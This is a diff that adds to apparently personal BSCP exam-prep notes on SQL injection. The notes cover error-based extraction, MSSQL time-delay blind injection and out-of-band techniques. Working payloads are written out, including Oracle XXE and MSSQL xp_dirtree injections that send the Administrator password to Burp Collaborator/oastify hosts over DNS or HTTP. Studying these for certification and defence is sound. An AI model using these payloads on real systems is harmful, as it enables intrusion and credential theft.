@@ -121,17 +121,100 @@ TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
 
 #### Extracting sensitive data via verbose SQL error messages
 
+```sql
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+```
+
+You can use the `CAST()` function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:
+
+```sql
+CAST((SELECT example_column FROM example_table) AS int)
+```
+
+![image-20260125172959560](E:\BSCP\hackthebox\BSCP\assets\image-20260125172959560.png)
 
 
 
+### 1.2.3 Exploiting blind SQL injection by triggering time delays
+
+For example, on Microsoft SQL Server
+
+```sql
+'; IF (1=2) WAITFOR DELAY '0:0:10'-- '; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+
+Using this technique, we can retrieve data by testing one character at a time:
+
+```sql
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+```
 
 
 
+### 1.2.4 Exploiting blind SQL injection using out-of-band (OAST) techniques
+
+ [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
+
+```sql
+1rpCQQe5rZwcoObH'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//9akut2hj5zvno7g5d4g5pdw4kvqmef24.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+
+ (URL解码后)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ 
+    <!ENTITY % remote SYSTEM "http://9akut2hj5zvno7g5d4g5pdw4kvqmef24.oastify.com/"> 
+    %remote;
+]>
+```
 
 
 
+Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:
+
+```sql
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+```
+
+This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:
+
+```sql
+S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
+```
+
+官方答案 (Oracle 版本):
+
+```
+x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+
+URL 解码后:
+
+```sql
+x' UNION SELECT EXTRACTVALUE(xmltype('
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE root [ 
+        <!ENTITY % remote SYSTEM "http://
+            '||(SELECT password FROM users WHERE username='administrator')||'
+            .BURP-COLLABORATOR-SUBDOMAIN/"> 
+        %remote;
+    ]>
+'),'/l') FROM dual--
+```
 
 
 
+# 2 Second-order SQL injection
+
+First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.
+
+Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use.
+
+Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way.
+
+## 2.1 Examining the database
 
 
+
+# 3 prevent sql vul
